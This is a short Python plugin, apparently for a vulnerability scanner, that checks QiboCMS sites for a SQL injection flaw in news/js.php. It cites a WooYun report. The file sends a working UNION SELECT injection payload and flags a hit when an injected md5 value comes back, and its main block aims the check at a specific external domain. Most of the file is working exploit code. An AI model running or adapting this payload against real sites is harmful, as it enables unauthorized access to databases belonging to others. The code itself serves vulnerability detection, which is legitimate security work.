#!/usr/bin/env python
# -*- coding: utf-8 -*-
#refer:http://www.wooyun.org/bugs/wooyun-2014-053187

import re
def assign(service, arg):
    if service == "qibocms":
        return True, arg

def audit(arg):
    payload='news/js.php?type=like&keyword=123%%2527%29/**/union/**/select/**/1,concat(0x7e7e7e,md5(1234),0x7e7e7e),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51%23'

    url=arg+payload
    code, head, res, errcode, _ = curl.curl2(url)
    if code == 200 and "81dc9bdb52d04dc20036dbd8313ed055" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('qibocms','http://bjsxsj.cn/')[1])